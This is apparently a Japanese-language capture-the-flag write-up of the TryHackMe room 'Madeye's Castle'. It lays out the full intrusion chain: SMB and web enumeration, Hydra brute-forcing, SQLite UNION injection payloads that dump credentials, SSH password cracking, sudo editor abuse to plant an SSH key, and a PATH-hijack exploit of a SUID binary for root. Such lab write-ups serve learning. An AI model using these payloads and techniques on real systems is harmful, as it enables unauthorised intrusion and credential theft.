# Madeye's Castle CTF

https://tryhackme.com/room/madeyescastle

## Enumeration

```shell
TARGET=10.201.9.77
sudo bash -c "echo $TARGET   castle.thm >> /etc/hosts"
```

### ポートスキャン

```sh
sudo nmap -vv -Pn -p- $TARGET

PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80,139,445 $TARGET

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
```

SSH, HTTP, SMB

### SMB

sambashare を発見。

```sh
$ smbclient -L //$TARGET -U ""                  
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Harry's Important Files
        IPC$            IPC       IPC Service (ip-10-201-59-191 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.201.59.191 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

2ファイル取得

```sh
smbclient //$TARGET/sambashare -U ""
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls -al
NT_STATUS_NO_SUCH_FILE listing \-al
smb: \> ls
  .                                   D        0  Thu Nov 26 10:19:20 2020
  ..                                  D        0  Thu Nov 26 09:57:55 2020
  spellnames.txt                      N      874  Thu Nov 26 10:06:32 2020
  .notes.txt                          H      147  Thu Nov 26 10:19:19 2020
```

メモ。hagrid, hermonine という名前を発見。

```sh
$ cat .notes.txt    
Hagrid told me that spells names are not good since they will not "rock you"
Hermonine loves historical text editors along with reading old books.
```

呪文名のリスト

```sh
$ head ./spellnames.txt 
avadakedavra
crucio
imperio
morsmordre
brackiumemendo
confringo
sectumsempra
sluguluseructo
furnunculus
densaugeo
```

### ディレクトリ列挙

dirb で、/backup, /backup/email を発見。

```sh
dirb http://$TARGET

---- Scanning URL: http://10.201.59.191/ ----
==> DIRECTORY: http://10.201.59.191/backup/                                                                          
+ http://10.201.59.191/index.html (CODE:200|SIZE:10965)                                                              
+ http://10.201.59.191/server-status (CODE:403|SIZE:278)                                                             
                                                                                                                     
---- Entering directory: http://10.201.59.191/backup/ ----
+ http://10.201.59.191/backup/email (CODE:200|SIZE:1527)
```

/backup/email

```txt
Madeye,

It is done. I registered the name you requested below but changed the "s" to a "z". You should be good to go.

RME

--------
On Tue, Nov 24, 2020 at 8:54 AM Madeye Moody <ctf@madeye.ninja> wrote:
Mr. Roar M. Echo,

Sounds great! Thanks, your mentorship is exactly what we need to avoid legal troubles with the Ministry of Magic.

Magically Yours,
madeye

--------
On Tue, Nov 24, 2020 at 8:53 AM Roar May Echo <info@roarmayecho.com> wrote:
Madeye,

I don't think we can do "hogwarts" due to copyright issues, but letâ€™s go with "hogwartz", how does that sound?

Roar

--------
On Tue, Nov 24, 2020 at 8:52 AM Madeye Moody <ctf@madeye.ninja> wrote:
Dear Mr. Echo,

Thanks so much for helping me develop my castle for TryHackMe. I think it would be great to register the domain name of "hogwarts-castle.thm" for the box. I have been reading about virtual hosting in Apache and it's a great way to host multiple domains on the same server. The docs says that...

> The term Virtual Host refers to the practice of running more than one web site (such as 
> company1.example.com and company2.example.com) on a single machine. Virtual hosts can be 
> "IP-based", meaning that you have a different IP address for every web site, or "name-based", 
> meaning that you have multiple names running on each IP address. The fact that they are 
> running on the same physical server is not apparent to the end user.

You can read more here: https://httpd.apache.org/docs/2.4/vhosts/index.html

What do you think?

Thanks,
madeye
```

hogwartz-castle.thm を /etc/hosts に登録

```sh
sudo bash -c "echo $TARGET   hogwartz-castle.thm >> /etc/hosts"
```

一般的なサブドメインリストでは何も出ない。

```shell
ffuf -u http://hogwartz-castle.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.hogwartz-castle.thm' -fs 10965
```

spellnames.txt をリストとしても何も出ない。

```sh
ffuf -u http://hogwartz-castle.thm -c -w ./spellnames.txt -H 'Host: FUZZ.hogwartz-castle.thm' -fs 10965
```

この謎解きが必要と思われる。

```
Hagrid told me that spells names are not good since they will not "rock you"
Hermonine loves historical text editors along with reading old books.
```

そもそも、http://hogwartz-castle.thm/ にアクセスするとサーバー内部エラー500が表示されている。Discordでほかのユーザーも同じ現象を報告しており、ルームバグと思われる。

# 進行不能バグのため中断

2026/03/08 試したら http://hogwartz-castle.thm/ を表示できたので再開。

パスワードブルートフォース。ヒットしなかった。

```sh
$ cat users.txt 
hagrid
hermonine
madeye
roar
echo
rme
RME
may

$ hydra hogwartz-castle.thm http-post-form "/login:user=^USER^&password=^PASS:Incorrect Username or Password" -L users.txt -P spellnames.txt -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-07 20:35:32
[DATA] max 30 tasks per 1 server, overall 30 tasks, 729 login tries (l:9/p:81), ~25 tries per task
[DATA] attacking http-post-form://hogwartz-castle.thm:80/login:user=^USER^&password=^PASS:Incorrect Username or Password
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-07 20:35:52
```

nameに対してSQLインジェクションを試したら下記エラーが出た。

```
{"error":"The password for Lucas Washington is incorrect! contact administrator. Congrats on SQL injection... keep digging"}
```

このユーザーを足してもブルートフォース失敗。

## SQLi

usersテーブル

```
user=a' union select tbl_name,2,3,4 FROM sqlite_master WHERE type='table'--&password=aaa

"The password for users is incorrect! 4"
```

usersテーブルの定義

```
user=a' union select sql,2,3,4 FROM sqlite_master WHERE type<>'meta' AND sql NOT NULL AND name ='users'----&password=aaa

"The password for CREATE TABLE users(\nname text not null,\npassword text not null,\nadmin int not null,\nnotes text not null) is incorrect! 4"
```

ユーザー名とパスワード

```
user=a' union select name,2,3,4 FROM users--&password=aaa

"The password for Aaliyah Allen is incorrect! 4"
```

```
user=a' union select password,2,3,4 FROM users--&password=aaa

"The password for 01529ec5cb2c6b0300ed8f4f3df6b282c1a68c45ff97c33d52007573774014d3f01a293a06b1f0f3eb6e90994cb2a7528d345a266203ef4cd3d9434a3a033ec0 is incorrect! 4"
```

ユーザーリスト

```
user=a' union select group_concat(name),2,3,4 FROM users--&password=aaa

"The password for Lucas Washington,Harry Turner,Andrea Phillips,Liam Hernandez,Adam Jenkins,Landon Alexander,Kennedy Anderson,Sydney Wright,Aaliyah Sanders,Olivia Murphy,Olivia Ross,Grace Brooks,Jordan White,Diego Baker,Liam Ward,Carlos Barnes,Carlos Lopez,Oliver Gonzalez,Sophie Sanchez,Maya Sanders,Joshua Reed,Aaliyah Allen,Jasmine King,Jonathan Long,Samuel Anderson,Julian Robinson,Gianna Harris,Madelyn Morgan,Ella Garcia,Zoey Gonzales,Abigail Morgan,Joseph Rivera,Elizabeth Cook,Parker Cox,Savannah Torres,Aaliyah Williams,Blake Washington,Claire Miller,Brody Stewart,Kimberly Murphy is incorrect! 4"
```

notes

```
"The password for contact administrator. Congrats on SQL injection... keep digging:My linux username is my first name, and password uses best64: contact administrator. Congrats on SQL injection... keep digging:contact administrator. Congrats on SQL injection... keep digging:contact 
......
```

2人目（Harry Turner）のLinuxユーザー名がファーストネームで、best64を使っている。

## SSH

スペルリストにbase64適用。

```sh
$ john --wordlist=spellnames.txt --rules=best64 --stdout > b64spell.txt
```

ブルートフォース成功！

```sh
$ hydra -l harry -P b64spell.txt $TARGET ssh -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-07 21:33:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 6103 login tries (l:1/p:6103), ~204 tries per task
[DATA] attacking ssh://10.48.164.54:22/
[STATUS] 385.00 tries/min, 385 tries in 00:01h, 5725 to do in 00:15h, 23 active
[STATUS] 366.67 tries/min, 1100 tries in 00:03h, 5010 to do in 00:14h, 23 active
[22][ssh] host: 10.48.164.54   login: harry   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 7 final worker threads did not complete until end.
[ERROR] 7 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-07 21:39:38
```

## 権限昇格１

pico は nano のエイリアス。

```sh
harry@ip-10-48-164-54:~$ sudo -l
[sudo] password for harry: 
Matching Defaults entries for harry on ip-10-48-164-54:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User harry may run the following commands on ip-10-48-164-54:
    (hermonine) /usr/bin/pico
    (hermonine) /usr/bin/pico
```

公開鍵を書き込んでSSH奪取。

```sh
harry@ip-10-48-164-54:~$ sudo -u hermonine /usr/bin/pico /home/hermonine/.ssh/authorized_keys
```

## 権限昇格２

pwn の痕跡

```sh
hermonine@ip-10-48-164-54:~$ cat .python_history
import pwn
exit()
import pwn
exit()
```

見慣れないSUIDバイナリ

```sh
hermonine@ip-10-48-164-54:~$ find / -perm -u=s -type f -ls 2>/dev/null
   401381     12 -rwsr-xr-x   1 root     root         8816 Nov 26  2020 /srv/time-turner/swagger
```

ghidra でリバース

```c
undefined8 main(void)
{
  time_t tVar1;
  long in_FS_OFFSET;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  local_14 = rand();
  printf("Guess my number: ");
  __isoc99_scanf(&DAT_00100b8d,&local_18);
  if (local_14 == local_18) {
    impressive();
  }
  else {
    puts("Nope, that is not what I was thinking");
    printf("I was thinking of %d\n",(ulong)local_14);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

void impressive(void)
{
  setregid(0,0);
  setreuid(0,0);
  puts("Nice use of the time-turner!");
  printf("This system architecture is ");
  fflush(stdout);
  system("uname -p");
  return;
}
```

最初、バッファオーバーフローかと思ったがうまくいかなかった。

```sh
hermonine@ip-10-48-164-54:~$ { python2 -c 'print "0" * 8'; cat; } | /srv/time-turner/swagger
Guess my number: Nope, that is not what I was thinking
I was thinking of 1151327652
```

- scanf は "%d" で実行されておりバッファオーバーフローの脆弱性ではない
- 乱数のシードが固定
- uname が相対パスのためbashに置き換えたらrootシェルを取れる

timeの解像度は秒単位なので srand(time(NULL))の値を出力するプログラムを作る。

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
    srand(time(NULL));
    printf("%d\n", rand());
    return 0;
}
```

エクスプロイト

```sh
hermonine@ip-10-48-164-54:~$ cp /bin/bash ./
hermonine@ip-10-48-164-54:~$ mv ./bash ./uname
hermonine@ip-10-48-164-54:~$ PATH=/home/hermonine:$PATH

hermonine@ip-10-48-164-54:~$ { ./get_rand; cat; } | /srv/time-turner/swagger
Guess my number: Nice use of the time-turner!
This system architecture is id
uid=0(root) gid=0(root) groups=0(root),1002(hermonine)
```

## 振り返り

- SQLインジェクションからヒントを読み取るのは予測しにくい構造

## Tags

#tags:SQLインジェクション #tags:Pwn
